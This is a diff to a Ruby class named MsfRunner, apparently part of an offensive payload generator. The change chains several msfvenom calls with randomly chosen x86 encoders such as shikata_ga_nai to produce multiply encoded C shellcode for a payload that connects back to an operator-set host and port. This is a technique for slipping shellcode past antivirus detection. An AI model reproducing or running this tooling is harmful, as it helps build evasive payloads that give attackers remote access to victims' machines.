@@ -104,19 +104,28 @@ class MsfRunner
     end
 
     def get_encoder
-
+        encoder_array_all = ["x86/bloxor",
+                            "x86/call4_dword_xor",
+                            "x86/countdown",
+                            "x86/fnstenv_mov",
+                            "x86/jmp_call_additive",
+                            "x86/shikata_ga_nai"]
+                            
+                            
         encoder_array = ["x86/shikata_ga_nai"]
-
+        encoder_array << encoder_array_all.sample
+        encoder_array << encoder_array_all.sample
     end
 
 
     def run
         encoder_array = get_encoder
+        msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f raw -e #{encoder_array[0]} -i #{random_number(10..15)} |"
+        msfstring << "msfvenom -e #{encoder_array[1]} -a x86 --platform windows -f raw -i #{random_number(2..4)} |"
+        msfstring << "msfvenom -e #{encoder_array[2]} -a x86 --platform windows -f c -i #{random_number(2..4)}"
 
         # debug
         #msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f c -e x86/jmp_call_additive -i #{random_number(10..15)} "
-
-        msfstring =  "msfvenom -p #{@payload}  lhost=#{@host}  lport=#{@port} #{@other} -f c -e #{encoder_array[0]} -i #{random_number(20..30)}"
 
         output_status "Retrieve shellcode from metasploit.."
         output_line msfstring if @debug
